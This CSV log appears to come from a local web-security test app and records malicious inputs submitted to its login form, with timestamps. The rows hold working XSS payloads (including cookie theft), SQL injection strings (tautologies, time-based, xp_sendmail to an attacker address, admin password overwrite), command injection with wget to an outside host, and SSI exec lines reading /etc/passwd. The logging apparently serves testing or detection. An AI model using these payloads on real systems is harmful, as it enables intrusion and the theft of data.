Malicious Payload,URL,Session Date,Session Time
<img src=javascript&#x3a;alert(1)> Gokul login ,http://localhost:5000/submit_login,2023-05-07,12:13:33
"<img src=""javascript:alert('XSS');""> gokul login ",http://localhost:5000/submit_login,2023-05-07,12:13:56
"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",http://localhost:5000/submit_login,2023-05-07,12:14:16
"<a href=""javascript:void(0)"" onclick=""alert('XSS')"">Click me</a> gokul login ",http://localhost:5000/submit_login,2023-05-07,12:14:34
<script>   alert('Outer script');   <script>alert('Inner script');</script> </script> gokul login ,http://localhost:5000/submit_login,2023-05-07,12:19:42
<img src=javascript&#x3a;alert(1)> gokul login ,http://localhost:5000/submit_login,2023-05-07,12:20:41
"<img src=""javascript:alert('XSS');""> gokul login ",http://localhost:5000/submit_login,2023-05-07,12:21:19
<script>alert(document.cookie)</script> ,http://localhost:5000/,2023-05-07,12:23:46
<img src=javascript&#x3a;alert(1)> gokul login ,http://localhost:5000/submit_login,2023-05-07,12:36:42
"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",http://localhost:5000/submit_login,2023-05-07,12:37:52
SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION SELECT 1 FROM nonexistent_table; gokul login ,http://localhost:5000/submit_login,2023-05-07,12:46:55
SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION SELECT 1 FROM users WHERE username = 'hacker' AND LENGTH(password) = 8; gokul login ,http://localhost:5000/submit_login,2023-05-07,12:47:46
"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION SELECT IF(SLEEP(5), 1, 0) FROM users WHERE username = 'hacker'; gokul login ",http://localhost:5000/submit_login,2023-05-07,12:48:29
"SELECT * FROM users WHERE username = 'admin'; EXEC master..xp_sendmail 'attacker@example.com', 'Test message', 'Test subject'; gokul login ",http://localhost:5000/submit_login,2023-05-07,12:49:07
INSERT INTO comments (comment_text) VALUES ('This is a normal comment'); UPDATE users SET password = 'hacked' WHERE username = 'admin'; gokul login ,http://localhost:5000/submit_login,2023-05-07,12:51:38
1' or '1' = '1 1' or '1' = '1 ,http://localhost:5000/,2023-05-07,12:52:13
1' or '1' = '1'))/* foo ,http://localhost:5000/,2023-05-07,12:53:16
10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )-- ,http://localhost:5000/,2023-05-07,13:03:47
"""&& perl -e 'print """"X""""x4096' gokul login ",http://localhost:5000/submit_login,2023-05-07,13:52:09
$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`) gokul login ,http://localhost:5000/submit_login,2023-05-07,14:16:16
"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",http://localhost:5000/submit_login,2023-05-07,14:17:03
"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",http://localhost:5000/submit_login,2023-05-07,14:20:47
"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",http://localhost:5000/submit_login,2023-05-07,14:25:31
"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",http://localhost:5000/submit_login,2023-05-07,14:27:39
"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> jjj login ",http://localhost:5000/submit_login,2023-05-07,14:30:37
"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",http://localhost:5000/submit_login,2023-05-07,14:58:45
"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> jjj login ",http://localhost:5000/submit_login,2023-05-07,15:02:12
"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> cccc login ",http://localhost:5000/submit_login,2023-05-07,15:06:57
<img src=javascript&#x3a;alert(1)> sugav login ,http://localhost:5000/submit_login,2023-05-07,18:07:24
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt; gokul login ,http://localhost:5000/submit_login,2023-05-07,18:15:39
1' or '1' = '1 1' or '1' = '1 ,http://localhost:5000/,2023-05-07,18:19:07
echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX iiii login ,http://localhost:5000/submit_login,2023-05-07,18:21:58
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt; iiii login ,http://localhost:5000/submit_login,2023-05-07,18:23:23
